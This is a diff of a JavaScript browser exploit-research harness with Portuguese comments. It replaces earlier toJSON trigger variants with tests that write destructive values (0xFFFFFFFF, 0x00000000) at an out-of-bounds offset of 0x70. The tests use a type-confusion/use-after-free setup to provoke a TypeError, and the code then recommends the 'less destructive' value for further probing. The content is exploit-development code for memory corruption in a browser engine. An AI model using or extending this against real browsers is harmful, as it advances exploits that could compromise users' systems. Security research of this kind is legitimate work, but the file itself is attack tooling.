@@ -2,121 +2,98 @@
 import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
 import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
 import { executeFocusedTestForTypeError, current_toJSON_call_count_for_TypeError_test } from './testJsonTypeConfusionUAFSpeculative.mjs';
+import { OOB_CONFIG } from '../config.mjs'; // Importado para OOB_CONFIG.BASE_OFFSET_IN_DV
+import { toHex } from '../utils.mjs';     // Importado para logging de offsets
 
-// --- Funções toJSON para teste de decomposição ULTRA MINIMALISTA ---
-
-// Variante 0: Absolutamente Mínima (apenas return {})
-// Não incrementa contador nem muda título para isolar o ato de ser chamada e retornar.
-function toJSON_Decomp_V0_ReturnEmptyObject() {
-    // current_toJSON_call_count_for_TypeError_test++; // O contador será 0 se o erro for antes
-    // document.title = `toJSON_Decomp_V0 Call`;
-    return {}; 
+// --- Função toJSON Minimalista para Testar o Gatilho do TypeError ---
+// Esta versão foca no incremento do contador, que foi o primeiro gatilho do TypeError
+// no teste Decomp_V1_CounterOnly.
+function toJSON_MinimalTriggerForCrash() {
+    current_toJSON_call_count_for_TypeError_test++; // Operação suspeita de causar o TypeError
+    // document.title = `toJSON_MinimalTrigger Call ${current_toJSON_call_count_for_TypeError_test}`; // Mantenha comentado inicialmente
+    return { minimal_trigger_call: current_toJSON_call_count_for_TypeError_test };
 }
 
-// Variante 1: Apenas incrementa o contador global e retorna.
-function toJSON_Decomp_V1_CounterOnly() {
-    current_toJSON_call_count_for_TypeError_test++;
-    // document.title = `toJSON_Decomp_V1 Call ${current_toJSON_call_count_for_TypeError_test}`;
-    return { step: 1, call: current_toJSON_call_count_for_TypeError_test };
-}
 
-// Variante 2: Apenas muda document.title e retorna.
-function toJSON_Decomp_V2_TitleOnly() {
-    current_toJSON_call_count_for_TypeError_test++; // Contar a entrada
-    document.title = `toJSON_Decomp_V2 Call ${current_toJSON_call_count_for_TypeError_test}`;
-    return { step: 2, call: current_toJSON_call_count_for_TypeError_test };
-}
+async function runDestructiveAndLessDestructiveTests() {
+    const FNAME_RUNNER = "runDestructiveAndLessDestructiveTests";
+    logS3(`==== INICIANDO Testes Destrutivo e Menos Destrutivo para TypeError ====`, 'test', FNAME_RUNNER);
 
-// Variante 3: Apenas uma operação matemática local e retorna.
-function toJSON_Decomp_V3_LocalMathOnly() {
-    current_toJSON_call_count_for_TypeError_test++;
-    document.title = `toJSON_Decomp_V3 Call ${current_toJSON_call_count_for_TypeError_test}`;
-    let x = 1 + 1; // Operação puramente local
-    return { step: 3, res: x, call: current_toJSON_call_count_for_TypeError_test };
-}
+    const criticalOffset = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
 
-// Variante 4 (Referência do problema anterior): Tentativa de logS3
-// Esta é para confirmar se o logS3 ainda é o gatilho como suspeitado.
-function toJSON_Decomp_V4_AttemptLogS3() {
-    current_toJSON_call_count_for_TypeError_test++;
-    const FNAME_toJSON = "toJSON_Decomp_V4_AttemptLogS3_Internal";
-    document.title = `toJSON_Decomp_V4 Call ${current_toJSON_call_count_for_TypeError_test}`;
-    try {
-        // Esta linha era o ponto de falha nos logs anteriores
-        logS3(`[${FNAME_toJSON}] Chamada ${current_toJSON_call_count_for_TypeError_test}! this: ${typeof this}`, "critical", FNAME_toJSON);
-    } catch (e) {
-        console.error("ERRO DENTRO de toJSON_Decomp_V4_AttemptLogS3 ao chamar logS3:", e);
-        document.title = "ERRO INTERNO toJSON_Decomp_V4";
-        throw e; // Re-lançar para ser pego pelo catch em executeFocusedTestForTypeError
+    // Teste 1: Confirmar Comportamento Destrutivo com 0xFFFFFFFF
+    logS3(`\n--- Teste 1: Valor Destrutivo (0xFFFFFFFF) em ${toHex(criticalOffset)} ---`, 'subtest', FNAME_RUNNER);
+    let result1 = await executeFocusedTestForTypeError(
+        "DestructiveTest_0xFFFFFFFF_at_0x70",
+        toJSON_MinimalTriggerForCrash,
+        0xFFFFFFFF
+    );
+    if (result1.errorOccurred && result1.errorOccurred.name === 'TypeError') {
+        logS3(`   CONFIRMADO: ${result1.errorOccurred.name} ocorreu como esperado.`, "vuln", FNAME_RUNNER);
+    } else if (result1.errorOccurred) {
+        logS3(`   INESPERADO: Outro erro ocorreu: ${result1.errorOccurred.name} - ${result1.errorOccurred.message}`, "warn", FNAME_RUNNER);
+    } else if (result1.potentiallyCrashed) {
+        logS3(`   INESPERADO: Teste pode ter congelado.`, "error", FNAME_RUNNER);
+    } else {
+        logS3(`   INESPERADO: Teste completou sem o TypeError esperado. Chamadas toJSON: ${result1.calls}`, "warn", FNAME_RUNNER);
     }
-    return { step: 4, logged: true, call: current_toJSON_call_count_for_TypeError_test };
-}
+    logS3(`   Título da página ao final de Teste 1: ${document.title}`, "info");
+    await PAUSE_S3(MEDIUM_PAUSE_S3);
 
 
-async function runUltraMinimalDecomposition() {
-    const FNAME_RUNNER = "runUltraMinimalDecomposition";
-    logS3(`==== INICIANDO Decomposição Ultra-Minimalista do Gatilho do TypeError ====`, 'test', FNAME_RUNNER);
+    // Teste 2: Tentar Valor Menos Destrutivo (0x00000000) em 0x70
+    logS3(`\n--- Teste 2: Valor Menos Destrutivo (0x00000000) em ${toHex(criticalOffset)} ---`, 'subtest', FNAME_RUNNER);
+    let result2 = await executeFocusedTestForTypeError(
+        "LessDestructiveTest_0x00000000_at_0x70",
+        toJSON_MinimalTriggerForCrash, // Usa a mesma toJSON minimalista
+        0x00000000
+    );
 
-    const tests = [
-        { description: "Decomp_V0_ReturnEmptyObject", func: toJSON_Decomp_V0_ReturnEmptyObject },
-        { description: "Decomp_V1_CounterOnly", func: toJSON_Decomp_V1_CounterOnly },
-        { description: "Decomp_V2_TitleOnly", func: toJSON_Decomp_V2_TitleOnly },
-        { description: "Decomp_V3_LocalMathOnly", func: toJSON_Decomp_V3_LocalMathOnly },
-        { description: "Decomp_V4_AttemptLogS3", func: toJSON_Decomp_V4_AttemptLogS3 },
-    ];
-
-    for (const test of tests) {
-        logS3(`\n--- Testando Variante toJSON Ultra-Minimalista: ${test.description} ---`, 'subtest', FNAME_RUNNER);
-        document.title = `Iniciando SubTeste: ${test.description}`; 
-        
-        const result = await executeFocusedTestForTypeError( // Chama a função do outro arquivo
-            test.description,
-            test.func 
-        );
-        
-        if (result.errorOccurred) {
-            logS3(`   RESULTADO ${test.description}: ERRO JS CAPTURADO: ${result.errorOccurred.name} - ${result.errorOccurred.message}. Chamadas toJSON: ${result.calls}`, "error", FNAME_RUNNER);
-        } else if (result.potentiallyCrashed) {
-            logS3(`   RESULTADO ${test.description}: CONGELAMENTO POTENCIAL. Chamadas toJSON: ${result.calls}`, "error", FNAME_RUNNER);
-        } else {
-            logS3(`   RESULTADO ${test.description}: Completou sem erro explícito. Chamadas toJSON: ${result.calls}`, "good", FNAME_RUNNER);
-        }
-        logS3(`   Título da página ao final de ${test.description}: ${document.title}`, "info");
-        await PAUSE_S3(MEDIUM_PAUSE_S3);
-
-        // Se um TypeError ocorrer, ele será capturado e logado.
-        // Vamos continuar para testar todas as variantes, a menos que seja um crash completo.
-        if (document.title.startsWith("CONGELOU?")) {
-            logS3("Congelamento detectado, interrompendo próximos testes de decomposição.", "error", FNAME_RUNNER);
-            break;
-        }
+    if (result2.errorOccurred && result2.errorOccurred.name === 'TypeError') {
+        logS3(`   INESPERADO: ${result2.errorOccurred.name} ocorreu com 0x00000000.`, "warn", FNAME_RUNNER);
+    } else if (result2.errorOccurred) {
+        logS3(`   INESPERADO: Outro erro ocorreu com 0x00000000: ${result2.errorOccurred.name} - ${result2.errorOccurred.message}`, "warn", FNAME_RUNNER);
+    } else if (result2.potentiallyCrashed) {
+        logS3(`   INESPERADO: Teste com 0x00000000 pode ter congelado.`, "error", FNAME_RUNNER);
+    } else {
+        logS3(`   RESULTADO ESPERADO (OU OK): Teste com 0x00000000 completou sem TypeError. Chamadas toJSON: ${result2.calls}`, result2.calls > 0 ? "good" : "info", FNAME_RUNNER);
     }
+    logS3(`   Título da página ao final de Teste 2: ${document.title}`, "info");
+    await PAUSE_S3(MEDIUM_PAUSE_S3);
 
-    logS3(`==== Decomposição Ultra-Minimalista do Gatilho do TypeError CONCLUÍDA ====`, 'test', FNAME_RUNNER);
+    logS3(`==== Testes Destrutivo e Menos Destrutivo CONCLUÍDOS ====`, 'test', FNAME_RUNNER);
+
+    // Instrução para o próximo passo baseado nos resultados
+    if (result1.errorOccurred?.name === 'TypeError' && !result2.errorOccurred && !result2.potentiallyCrashed && result2.calls > 0) {
+        logS3(`\nPRÓXIMO PASSO RECOMENDADO: O valor 0x00000000 parece ser "menos destrutivo".`, "good", FNAME_RUNNER);
+        logS3(`   Considere usar 0x00000000 com a 'detailed_toJSON_for_UAF_TC_test_WithDepthControl_AndSlice' para sondagem.`, "info", FNAME_RUNNER);
+    } else if (result1.errorOccurred?.name === 'TypeError' && result2.errorOccurred?.name === 'TypeError') {
+        logS3(`\nAVISO: Ambos os valores (0xFFFFFFFF e 0x00000000) causaram TypeError. A corrupção em 0x70 é muito sensível.`, "warn", FNAME_RUNNER);
+    } else {
+        logS3(`\nREVISAR RESULTADOS: O comportamento foi inesperado. Verifique os logs detalhadamente.`, "info", FNAME_RUNNER);
+    }
 }
 
 export async function runAllAdvancedTestsS3() {
-    const FNAME = 'runAllAdvancedTestsS3_UltraMinimalDecomp';
+    const FNAME = 'runAllAdvancedTestsS3_DestructiveThenLessDestructive';
     const runBtn = getRunBtnAdvancedS3();
     const outputDiv = getOutputAdvancedS3();
 
     if (runBtn) runBtn.disabled = true;
     if (outputDiv) outputDiv.innerHTML = '';
 
-    logS3(`==== INICIANDO Script 3: Decomposição Ultra-Minimalista do Gatilho do TypeError ====`,'test', FNAME);
-    document.title = "Iniciando Script 3 - Decomp UltraMinimal";
+    logS3(`==== INICIANDO Script 3: Testes Destrutivo e Menos Destrutivo para TypeError ====`,'test', FNAME);
+    document.title = "Iniciando Script 3 - Teste Destrutivo/Menos Destrutivo";
     
-    await runUltraMinimalDecomposition();
+    await runDestructiveAndLessDestructiveTests();
     
-    logS3(`\n==== Script 3 CONCLUÍDO (Decomposição Ultra-Minimalista do Gatilho do TypeError) ====`,'test', FNAME);
+    logS3(`\n==== Script 3 CONCLUÍDO (Testes Destrutivo e Menos Destrutivo para TypeError) ====`,'test', FNAME);
     if (runBtn) runBtn.disabled = false;
     
-    if (document.title.startsWith("Iniciando") || document.title.startsWith("CONGELOU?")) {
-        // Não sobrescrever
-    } else if (document.title.includes("ERRO")) {
-        // Manter título de erro
-    }
-    else {
-        document.title = "Script 3 Concluído - Decomp UltraMinimal";
+    // Ajuste final do título
+    if (document.title.startsWith("Iniciando") || document.title.includes("ERRO") || document.title.includes("CONGELOU?")) {
+        // Manter título
+    } else {
+        document.title = "Script 3 Concluído - D/LD Test";
     }
 }
